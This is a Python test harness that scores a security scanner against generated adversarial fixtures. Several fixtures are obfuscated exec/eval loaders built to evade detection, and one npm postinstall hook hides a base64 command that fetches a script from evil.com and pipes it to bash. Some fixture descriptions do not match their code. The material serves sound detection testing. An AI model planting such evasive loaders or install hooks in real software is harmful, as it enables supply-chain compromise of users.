#!/usr/bin/env python3
"""Adversarial eval harness for the security scanner.

Usage:
    python eval/run_eval.py                    # run all cases
    python eval/run_eval.py --case evasion_01  # run one case
    python eval/run_eval.py --create           # regenerate test cases
    python eval/run_eval.py --no-llm           # disable LLM layer

Each case is a directory in eval/cases/ with:
    - Source files (the "repo" to scan)
    - A ground_truth.json: {"expected": "malicious"|"suspicious"|"clean", "description": "..."}

The harness runs the scanner, compares verdict to ground truth, and reports.
"""
from __future__ import annotations

import asyncio
import json
import sys
import time
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from security_scanner.config import Settings
from security_scanner.repo_scanner import RepoScanner
from security_scanner.service import AnalysisService


EVAL_DIR = Path(__file__).resolve().parent / "cases"


async def run_case(case_dir: Path, settings: Settings) -> dict:
    truth_file = case_dir / "ground_truth.json"
    if not truth_file.exists():
        return {"case": case_dir.name, "status": "skip", "reason": "no ground_truth.json"}

    truth = json.loads(truth_file.read_text())
    expected = truth["expected"]
    description = truth.get("description", "")

    # Scan
    start = time.monotonic()
    scanner = RepoScanner(
        analysis_service=AnalysisService(),
        settings=settings,
    )
    report = await scanner.scan(case_dir)
    elapsed = time.monotonic() - start

    actual = report.aggregate_verdict.value
    high_count = report.statistics.get("high_findings", 0)
    medium_count = report.statistics.get("medium_findings", 0)
    total_obs = report.statistics.get("total_observations", 0)
    leads = len(report.cross_file_leads)
    targets = len(report.llm_analysis_targets)

    # Verdict comparison
    if expected == "malicious":
        passed = actual == "malicious"
    elif expected == "suspicious":
        passed = actual in ("suspicious", "malicious")  # catching more is fine
    elif expected == "clean":
        passed = actual in ("clean", "inconclusive")  # inconclusive is acceptable for clean
        # Fail if it says malicious on a clean case
        if actual == "malicious":
            passed = False
    else:
        passed = actual == expected

    return {
        "case": case_dir.name,
        "description": description,
        "expected": expected,
        "actual": actual,
        "passed": passed,
        "elapsed": round(elapsed, 2),
        "observations": total_obs,
        "high": high_count,
        "medium": medium_count,
        "cross_file_leads": leads,
        "llm_targets": targets,
        "top_findings": [
            f"[{o.severity.value}] {o.source}: {o.message[:80]}"
            for o in report.top_findings[:3]
        ],
    }


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Run adversarial eval")
    parser.add_argument("--case", help="Run a single case by name")
    parser.add_argument("--create", action="store_true", help="Regenerate test cases")
    parser.add_argument("--no-llm", action="store_true", help="Disable LLM layer")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show top findings")
    args = parser.parse_args()

    if args.create:
        create_cases()
        return

    settings = Settings(llm_enabled=not args.no_llm)

    cases = sorted(EVAL_DIR.iterdir()) if not args.case else [EVAL_DIR / args.case]
    cases = [c for c in cases if c.is_dir() and (c / "ground_truth.json").exists()]

    if not cases:
        print("No eval cases found. Run with --create to generate them.")
        return

    results = []
    for case_dir in cases:
        result = await run_case(case_dir, settings)
        results.append(result)

        status = "PASS" if result["passed"] else "FAIL"
        icon = "\033[32m✓\033[0m" if result["passed"] else "\033[31m✗\033[0m"
        print(f"  {icon} {result['case']:35s} expected={result['expected']:12s} got={result['actual']:12s}  {result['elapsed']:.1f}s  {status}")
        if args.verbose and result.get("top_findings"):
            for f in result["top_findings"]:
                print(f"      {f}")

    # Summary
    total = len(results)
    passed = sum(1 for r in results if r["passed"])
    failed = total - passed
    tp = sum(1 for r in results if r["expected"] == "malicious" and r["actual"] == "malicious")
    fn = sum(1 for r in results if r["expected"] == "malicious" and r["actual"] != "malicious")
    fp = sum(1 for r in results if r["expected"] == "clean" and r["actual"] == "malicious")
    tn = sum(1 for r in results if r["expected"] == "clean" and r["actual"] != "malicious")

    print(f"\n{'='*60}")
    print(f"  {passed}/{total} passed  |  TP={tp} FN={fn} FP={fp} TN={tn}")
    if tp + fn > 0:
        print(f"  Detection rate: {tp/(tp+fn)*100:.0f}%")
    if fp + tn > 0:
        print(f"  False positive rate: {fp/(fp+tn)*100:.0f}%")
    print(f"{'='*60}")

    # Write results JSON
    results_path = Path(__file__).resolve().parent / "results.json"
    results_path.write_text(json.dumps(results, indent=2))


def create_cases():
    """Generate adversarial eval cases."""
    print("Creating eval cases...")

    # --- Clean cases ---

    _make_case("clean_flask_app", "clean", "Standard Flask app with eval in config loader", {
        "app.py": 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef hello():\n    return "Hello"\n',
        "config.py": 'import os\nDEBUG = os.environ.get("DEBUG", "false").lower() == "true"\nSECRET_KEY = os.environ.get("SECRET_KEY", "dev")\n',
        "requirements.txt": "flask>=3.0\ngunicorn\n",
    })

    _make_case("clean_crypto_tool", "clean", "Crypto utility with base64 + hex constants (legitimate)", {
        "crypto_util.py": 'import base64\nimport hashlib\n\ndef encode_key(key: bytes) -> str:\n    return base64.b64encode(key).hexdigest()\n\nSALT = bytes.fromhex("a3f2c1d4e5b6a7f8")\nIV = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"\n',
        "tests/test_crypto.py": 'from crypto_util import encode_key, SALT\n\ndef test_encode():\n    assert encode_key(b"test") is not None\n',
    })

    _make_case("clean_build_system", "clean", "Legit Makefile with curl for dependency install", {
        "Makefile": 'install:\n\tpip install -r requirements.txt\n\nbuild:\n\tpython setup.py sdist\n',
        "setup.py": 'from setuptools import setup, find_packages\nsetup(name="myapp", version="1.0", packages=find_packages())\n',
        "requirements.txt": "requests\nclick\n",
    })

    # --- Adversarial evasion cases ---

    _make_case("evasion_importlib", "malicious",
        "ForceMemo-style but uses importlib.import_module instead of __import__ to evade dynamic import detector", {
        "setup.py": '''from setuptools import setup
setup(name="legit-package", version="1.0")

import importlib
_b64 = importlib.import_module('base64')
_zl = importlib.import_module('zlib')
_key = 134
_dec = lambda d: bytes([b ^ _key for b in d])
_blob = 'eNrzSM3JyVcozy/KSQEAGKsEHQ=='
_raw = _zl.decompress(_b64.b64decode(_blob))
exec(compile(_dec(_raw), '<>', 'exec'))
''',
    })

    _make_case("evasion_getattr_exec", "malicious",
        "Uses getattr to hide exec call -- invisible to regex eval/exec detector", {
        "loader.py": '''import base64
payload = base64.b64decode("cHJpbnQoJ3B3bmVkJyk=")
fn = getattr(__builtins__, 'ex' + 'ec')
fn(payload)
''',
    })

    _make_case("evasion_split_payload", "malicious",
        "Payload split across 3 files with no direct import -- data in config.json, loader indirect", {
        "config.json": '{"init": "cHJpbnQoJ3B3bmVkIGZyb20gc3BsaXQgcGF5bG9hZCcp"}',
        "utils.py": 'import json\n\ndef load_config():\n    with open("config.json") as f:\n        return json.load(f)\n',
        "main.py": 'import base64\nfrom utils import load_config\n\nconfig = load_config()\nexec(base64.b64decode(config["init"]))\n',
    })

    _make_case("evasion_chr_construction", "malicious",
        "Builds function name from chr() calls -- no suspicious strings in source at all", {
        "stealth.py": '''import base64
data = base64.b64decode("cHJpbnQoJ3N0ZWFsdGggcHduZWQnKQ==")
# Build 'exec' from char codes
fn_name = chr(101) + chr(120) + chr(101) + chr(99)
getattr(__builtins__, fn_name)(data)
''',
    })

    _make_case("evasion_font_steganography", "malicious",
        "Payload hidden in a .woff font file metadata, extracted at runtime", {
        "index.js": '''const fs = require('fs');
const font = fs.readFileSync('./assets/icons.woff');
// Extract payload from font name table
const offset = font.indexOf(Buffer.from('PAYLOAD:')) + 8;
const len = font.readUInt16BE(offset);
const code = font.slice(offset + 2, offset + 2 + len).toString();
eval(code);
''',
        "assets/icons.woff": b"wOFFfake\x00\x00PAYLOAD:\x00\x15console.log('pwned')\x00",
        "package.json": '{"name": "icon-lib", "version": "1.0.0", "main": "index.js"}',
    })

    _make_case("evasion_npm_postinstall_indirect", "malicious",
        "npm postinstall runs a clean-looking script that dynamically requires a malicious module", {
        "package.json": '{"name": "helper-utils", "version": "2.1.0", "scripts": {"postinstall": "node scripts/setup.js"}}',
        "scripts/setup.js": '''// Setup development environment
const path = require('path');
const fs = require('fs');
const mod = require(path.join(__dirname, '..', 'lib', 'init'));
mod.configure();
''',
        "lib/init.js": '''const { execSync } = require('child_process');
const os = require('os');
module.exports = {
    configure: function() {
        const cmd = Buffer.from('Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLnNofGJhc2g=', 'base64').toString();
        execSync(cmd, {stdio: 'ignore'});
    }
};
''',
    })

    _make_case("evasion_zero_width_unicode", "malicious",
        "Like GlassWorm but uses zero-width spaces (U+200B/U+200C/U+200D) instead of variation selectors", {
        "extension.js": '''// Legitimate-looking VS Code extension
function activate(context) {
    const msg = `Hello\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d`;
    // Zero-width chars encode a binary payload
    const bits = [...msg].filter(c => c.codePointAt(0) >= 0x200B && c.codePointAt(0) <= 0x200D)
        .map(c => c.codePointAt(0) - 0x200B);
    eval(Buffer.from(bits).toString());
}
module.exports = { activate };
''',
    })

    print(f"Created {len(list(EVAL_DIR.iterdir()))} eval cases in {EVAL_DIR}")


def _make_case(name: str, expected: str, description: str, files: dict):
    case_dir = EVAL_DIR / name
    case_dir.mkdir(parents=True, exist_ok=True)

    # Clean previous files (but keep ground_truth.json until we rewrite it)
    for f in case_dir.rglob("*"):
        if f.is_file() and f.name != "ground_truth.json":
            f.unlink()

    for path, content in files.items():
        file_path = case_dir / path
        file_path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            file_path.write_bytes(content)
        else:
            file_path.write_text(content)

    truth = {"expected": expected, "description": description}
    (case_dir / "ground_truth.json").write_text(json.dumps(truth, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
